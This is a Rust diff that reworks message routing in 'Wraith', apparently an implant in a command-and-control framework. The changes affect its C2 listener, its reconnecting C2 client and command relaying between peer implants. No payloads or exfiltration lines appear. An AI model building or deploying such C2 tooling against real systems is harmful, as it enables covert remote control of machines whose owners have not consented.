@@ -60,11 +60,23 @@ impl Wraith {
         let relay_commands = RelayCommands::new(relay_manager.clone(), Arc::clone(&tunnel_manager));
         let agent_commands = AgentCommands::new(Arc::clone(&tunnel_manager));
 
-        let dispatcher = MessageDispatcher::new(relay_commands, agent_commands);
+        // Use with_commands to properly configure the tunnel manager with routing
+        let tunnel_manager = Arc::new(TunnelManager::with_commands(relay_commands, agent_commands));
 
-        // Set dispatcher and state on tunnel_manager for peer message routing
-        tunnel_manager.set_dispatcher(dispatcher.clone());
+        // Set state on tunnel_manager for dedup checking
         tunnel_manager.set_state(Arc::clone(&state));
+
+        // Re-register callback since we created a new tunnel_manager
+        let state_clone = Arc::clone(&state);
+        tunnel_manager.set_peer_add_callback(move |wraith_id, hostname, sender| {
+            let mut s = state_clone.lock().unwrap();
+            s.add_peer(wraith_id.to_string(), hostname.to_string(), sender.clone());
+        });
+
+        let dispatcher = MessageDispatcher::new(
+            RelayCommands::new(relay_manager, Arc::clone(&tunnel_manager)),
+            AgentCommands::new(Arc::clone(&tunnel_manager)),
+        );
 
         Self {
             connection: None,
@@ -119,7 +131,7 @@ impl Wraith {
                     let msg_type = msg.msg_type;
                     match msg_type {
                         x if x == MessageType::Command as i32 => {
-                            if let Some(response) = self.dispatcher.route_message(msg, Arc::clone(&self.state)).await {
+                            if let Some(response) = self.tunnel_manager.route_message(msg, Arc::clone(&self.state)).await {
                                 connection.send_message(&response).await?;
                             }
                         }
@@ -143,7 +155,7 @@ impl Wraith {
     /// This method blocks - spawn it as a task if you need to do other things
     pub async fn run_c2_listener(&self, c2_addr: String) {
         let state = Arc::clone(&self.state);
-        let dispatcher = self.dispatcher.clone();
+        let tunnel_manager = Arc::clone(&self.tunnel_manager);
 
         loop {
             info!("C2 listener waiting for connection on {}", c2_addr);
@@ -154,10 +166,10 @@ impl Wraith {
                         Ok((stream, peer_addr)) => {
                             info!("C2 connected from: {}", peer_addr);
                             let state = Arc::clone(&state);
-                            let dispatcher = dispatcher.clone();
+                            let tunnel_manager = tunnel_manager.clone();
 
                             tokio::spawn(async move {
-                                if let Err(e) = Self::handle_c2_connection(stream, state, dispatcher).await {
+                                if let Err(e) = Self::handle_c2_connection(stream, state, tunnel_manager).await {
                                     error!("C2 handler error: {}", e);
                                 }
                             });
@@ -179,7 +191,7 @@ impl Wraith {
     async fn handle_c2_connection(
         stream: tokio::net::TcpStream,
         state: Arc<Mutex<WraithState>>,
-        dispatcher: MessageDispatcher,
+        tunnel_manager: Arc<crate::wraith::tunnel::TunnelManager>,
     ) -> Result<(), Box<dyn std::error::Error>> {
         let mut connection = TcpConnection::from_stream(stream);
 
@@ -201,8 +213,7 @@ impl Wraith {
                     let msg_type = msg.msg_type;
                     match msg_type {
                         x if x == MessageType::Command as i32 => {
-                            // Use route_message to properly route commands to peers when target_wraith_id is set
-                            if let Some(response) = dispatcher.route_message(msg, Arc::clone(&state)).await {
+                            if let Some(response) = tunnel_manager.route_message(msg, Arc::clone(&state)).await {
                                 connection.send_message(&response).await?;
                             }
                         }
@@ -266,7 +277,7 @@ impl Wraith {
     /// Also spawns peer connection which should be handled separately
     pub async fn run_c2_client(&self, host: String, port: u16) {
         let state = Arc::clone(&self.state);
-        let dispatcher = self.dispatcher.clone();
+        let tunnel_manager = Arc::clone(&self.tunnel_manager);
 
         loop {
             let addr = format!("{}:{}", host, port);
@@ -275,7 +286,7 @@ impl Wraith {
             match tokio::net::TcpStream::connect(&addr).await {
                 Ok(stream) => {
                     info!("C2 client connected to {}", addr);
-                    match Self::handle_c2_connection(stream, Arc::clone(&state), dispatcher.clone()).await {
+                    match Self::handle_c2_connection(stream, Arc::clone(&state), tunnel_manager.clone()).await {
                         Ok(_) => info!("C2 connection closed gracefully"),
                         Err(e) => error!("C2 connection error: {}", e),
                     }
